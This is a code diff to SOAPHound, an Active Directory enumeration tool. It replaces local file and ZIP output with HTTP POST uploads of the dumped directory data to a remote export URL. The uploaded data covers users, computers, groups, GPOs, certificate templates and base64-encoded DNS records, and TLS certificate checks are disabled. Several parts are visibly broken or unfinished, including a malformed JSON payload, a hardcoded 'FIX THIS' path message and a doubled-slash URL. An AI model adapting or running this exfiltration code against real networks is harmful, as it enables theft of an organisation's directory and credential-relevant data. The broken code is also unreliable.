@@ -13,50 +13,50 @@ using SOAPHound.ADWS;
 using SOAPHound.Enums;
 using SOAPHound.Processors;
 using System.Linq;
+using System.Net.Http;
+using System.Threading.Tasks;
+using System.Net.Security;
+using System.Security.Cryptography;
+using System.Windows.Media.Animation;
 
-
-public class ZipUtility
+class PostToUrl
 {
-    public static void AddStringToZipArchive(string zipfile, string filename, string content)
+    public static bool PostMessage(string url, string jsonStr)
     {
-        // Delete the file if it exists.
-/*        if (File.Exists(zipfile))
+        try
         {
-            FileStream zipToOpen = File.Open(zipfile, FileMode.OpenOrCreate);
-        }*/
-        using (FileStream zipToOpen = File.Open(zipfile, FileMode.OpenOrCreate))
-        {
-            using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Update))
+            using (HttpClientHandler handler = new HttpClientHandler())
             {
-                ZipArchiveEntry readmeEntry = archive.CreateEntry(filename);
-                using (StreamWriter writer = new StreamWriter(readmeEntry.Open()))
+                // Bypass SSL certificate validation (for testing purposes only)
+                handler.ServerCertificateCustomValidationCallback = (sender, cert, chain, sslPolicyErrors) => true;
+
+                using (HttpClient client = new HttpClient(handler))
                 {
-                    writer.WriteLine(content);
-                    Console.WriteLine("Added " + filename +" to ZIP file: " + zipfile);
+                    StringContent content = new StringContent(jsonStr, Encoding.UTF8, "application/json");
+                    var task = Task.Run(() => client.PostAsync(url, content));
+                    task.Wait();
+                    HttpResponseMessage response =  task.Result;
+
+                    // Return true if the request was sent, even if the status code was in the 4xx range
+                    return response.IsSuccessStatusCode || (response.StatusCode >= System.Net.HttpStatusCode.BadRequest && response.StatusCode < System.Net.HttpStatusCode.InternalServerError);
                 }
             }
         }
+        catch
+        {
+            // Return false for any other case (e.g., network issues, invalid URL)
+            return false;
+        }
     }
+
 }
 
-public static class RandomStringGenerator
+public class Base64Encoder
 {
-    private static readonly Random Random = new Random();
-    private const string AllowedChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-
-    public static string GenerateRandomString(int length)
+    public static string EncodeToBase64(string plainText)
     {
-        int maxAllowedCharsLength = AllowedChars.Length;
-        var randomBytes = new byte[length];
-        Random.NextBytes(randomBytes);
-
-        var chars = new char[length];
-        for (int i = 0; i < length; i++)
-        {
-            chars[i] = AllowedChars[randomBytes[i] % maxAllowedCharsLength];
-        }
-
-        return new string(chars);
+        byte[] plainTextBytes = Encoding.UTF8.GetBytes(plainText);
+        return Convert.ToBase64String(plainTextBytes);
     }
 }
 
@@ -84,7 +84,7 @@ namespace SOAPHound
         public string ldapbase = null;
         public string domainName = null;
         public string cacheFileName = null;
-        public string outputDirectory = null;
+        public string exportUrl = null;
 
         public static void Main(string[] args)
         {
@@ -164,15 +164,15 @@ namespace SOAPHound
 
             if (options.DNSDump || options.CertDump || options.BHDump)
             {
-                if (String.IsNullOrEmpty(options.OutputDirectory))
+                if (String.IsNullOrEmpty(options.ExportUrl))
                 {
 
-                    DisplayErrorMessage("Output directory is required. Use --outputdirectory");
+                    DisplayErrorMessage("Export Url is required. Use --exporturl");
                     return;
                 }
                 else
                 {
-                    outputDirectory = options.OutputDirectory.TrimEnd('\\') + "\\";
+                    exportUrl = options.ExportUrl.TrimEnd('/') + "/";
                 }
             }
 
@@ -302,10 +302,6 @@ namespace SOAPHound
             ADWSUtils.Credential = Credential;
             ADWSUtils.nolaps = nolaps;
 
-            if (!string.IsNullOrEmpty(outputDirectory))
-            {
-                System.IO.Directory.CreateDirectory(outputDirectory);
-            }
             if (!string.IsNullOrEmpty(cacheFileName))
             {
                 System.IO.Directory.CreateDirectory(Path.GetDirectoryName(cacheFileName));
@@ -331,14 +327,22 @@ namespace SOAPHound
         private void DNSDump()
         {
             List<ADObject> dnsobjects = ADWSUtils.GetObjects("dns");
-            string outputFileName = outputDirectory + "DNS.txt";
+            
+            string filecontent = "";
             foreach (ADObject dnsobject in dnsobjects)
             {
-                File.AppendAllText(outputFileName, "\r\n" + dnsobject.Name);
-                hDNSRecord.ReadandOutputDNSObject(dnsobject.DnsRecord, outputFileName);
+                filecontent += "\r\n" + dnsobject.Name;
+                filecontent += hDNSRecord.ReadandOutputDNSObject(dnsobject.DnsRecord);
+
             }
+            // Console.WriteLine(filecontent);
+            string b64;
+            b64 = Base64Encoder.EncodeToBase64(filecontent);
+            // Console.WriteLine(b64 );
+            PostToUrl.PostMessage(exportUrl, "{\n\t\"payload\": \"" + b64 + "\"");
+
             Console.WriteLine("-------------");
-            Console.WriteLine("Output file generated in " + outputDirectory);
+            Console.WriteLine("Output file generated in " + "c:\\" + "DNS.txt"); // FIX THIS
             dnsdump = false;
         }
 
@@ -402,12 +406,12 @@ namespace SOAPHound
             outputCA.meta.count = outputCA.data.Count();
             outputCATemplate.meta.count = outputCATemplate.data.Count();
             var jsonString = JsonConvert.SerializeObject(outputCA);
-            File.WriteAllText(outputDirectory + "CA.json", jsonString);
+            PostToUrl.PostMessage(exportUrl +"/CA.json", jsonString);
+
             //Console.WriteLine(jsonString);
             jsonString = JsonConvert.SerializeObject(outputCATemplate);
-            File.WriteAllText(outputDirectory + "CATemplate.json", jsonString);
-            Console.WriteLine("-------------");
-            Console.WriteLine("Output files generated in " + outputDirectory);
+            PostToUrl.PostMessage(exportUrl + "/CATemplate.json", jsonString);
+            Console.WriteLine("Posted to /CATEmplate.json");
             certdump = false;
         }
 
@@ -672,13 +676,13 @@ namespace SOAPHound
                 }                
             }
 
-            string zipfile = outputDirectory + RandomStringGenerator.GenerateRandomString(32) + ".zip";
+          
             outputUsers.meta.count = outputUsers.data.Count();
             if (outputUsers.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputUsers);
                 //File.WriteAllText(outputDirectory + r_header + ".json", jsonString);
-                ZipUtility.AddStringToZipArchive(zipfile, "outputUsers.json" , jsonString);
+                PostToUrl.PostMessage(exportUrl+ "outputUsers.json" , jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -686,7 +690,7 @@ namespace SOAPHound
             if (outputComputers.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputComputers);
-                ZipUtility.AddStringToZipArchive(zipfile, "outputComputers.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "outputComputers.json", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -694,7 +698,7 @@ namespace SOAPHound
             if (outputGroups.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputGroups);
-                ZipUtility.AddStringToZipArchive(zipfile, "outputGroups.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "outputGroups.json", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -702,7 +706,7 @@ namespace SOAPHound
             if (outputDomains.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputDomains);
-                ZipUtility.AddStringToZipArchive(zipfile, "outputDomains.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "outputDomains.json", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -710,7 +714,7 @@ namespace SOAPHound
             if (outputGPOs.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputGPOs);
-                ZipUtility.AddStringToZipArchive(zipfile, "outputGPOs.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "outputGPOs.json", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -718,7 +722,7 @@ namespace SOAPHound
             if (outputOUs.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputOUs);
-                ZipUtility.AddStringToZipArchive(zipfile, "outputOUs.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "outputOUs.json", jsonString);
                 //Console.WriteLine(jsonString);
             }
 
@@ -726,11 +730,11 @@ namespace SOAPHound
             if (outputContainers.meta.count > 0)
             {
                 var jsonString = JsonConvert.SerializeObject(outputContainers);
-                ZipUtility.AddStringToZipArchive(zipfile, "outputContainers.json", jsonString);
+                PostToUrl.PostMessage(exportUrl+ "outputContainers.json", jsonString);
                 //Console.WriteLine(jsonString);
             }
             Console.WriteLine("-------------");
-            Console.WriteLine("Output files with random names generated in " + outputDirectory);
+            Console.WriteLine("Exported files to: " + exportUrl);
             Console.WriteLine("-------------");
 
         }
